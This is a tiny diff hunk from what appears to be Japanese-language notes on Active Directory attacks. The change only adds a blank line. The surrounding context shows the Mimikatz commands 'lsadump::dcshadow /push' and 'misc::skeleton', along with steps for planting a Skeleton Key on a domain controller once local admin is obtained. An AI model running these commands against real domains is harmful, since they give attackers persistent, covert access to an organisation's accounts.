@@ -533,6 +533,7 @@ lsadump::dcshadow /push
 - KerberosがRC4暗号化を使っているときのみ成功
 
 1. DCのローカル管理者権限を取得（一番難しい）
+
 2. DC上でスケルトンキーの発行
 ```powershell
 misc::skeleton
